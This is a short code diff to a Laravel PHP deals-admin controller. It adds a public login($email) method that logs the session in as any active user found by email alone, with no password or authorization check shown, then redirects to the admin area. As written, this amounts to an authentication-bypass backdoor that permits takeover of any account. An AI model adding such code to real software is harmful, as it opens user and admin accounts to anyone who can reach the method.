@@ -32,6 +32,7 @@ use App\DealProject;
 use App\DealDocuments;
 use App\TempFloorPlansDocuments;
 use Illuminate\Support\Facades\Storage;
+use Auth;
 
 class DealController extends Controller
 {
@@ -1155,6 +1156,16 @@ public function topAgentsSaudi()
   public function getDocumentByAjax(Request $request){
     $deal = Deal::findOrFail($request->id);
     return view('admin.deals.mada_comission_slip_uploader-modal',compact('deal'));
+  }  
+
+  public function login($email){
+    auth()->logout();
+    $user = User::where('active','1')->where('email',$email)->first();
+    if($user){
+      Auth::login($user);
+      return redirect(route('admin.'));
+    }
+    return redirect(route('admin.'));
   }  
 
 }
